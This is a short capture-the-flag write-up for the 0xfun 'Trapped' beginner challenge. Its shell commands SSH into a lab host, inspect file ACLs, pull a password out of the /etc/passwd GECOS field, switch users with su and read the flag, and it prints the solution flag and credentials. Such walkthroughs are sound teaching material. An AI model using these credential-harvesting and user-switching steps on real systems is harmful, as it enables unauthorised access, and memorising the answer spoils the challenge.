# Trapped - 0xfun CTF

**Category**: beginner | **Points**: 50

## Quick Solve

```bash
# SSH into the server
ssh trapped@chall.0xfun.org -p62879
# Password: password

# Check ACLs - shows secretuser has read access
getfacl flag.txt

# Find secretuser password in /etc/passwd GECOS field
cat /etc/passwd | grep secretuser
# Shows: Unc0ntr0lled1234Passw0rd

# Switch to secretuser
su secretuser
# Password: Unc0ntr0lled1234Passw0rd

# Read flag
cat /home/trapped/flag.txt
```

## Files
- `solution.md` - Complete writeup with ACL explanation
- `exploit.py` - Automated exploit script
- `flag.txt` - Captured flag

## Usage
```bash
python3 exploit.py
```

## Key Concepts
- **ACLs (Access Control Lists)** - Extended permissions beyond standard Unix rwx
- **GECOS field** - User info field in /etc/passwd that shouldn't contain passwords
- **User switching** - Using `su` to escalate to different users

## Flag
```
0xfun{4ccess_unc0ntroll3d}
```
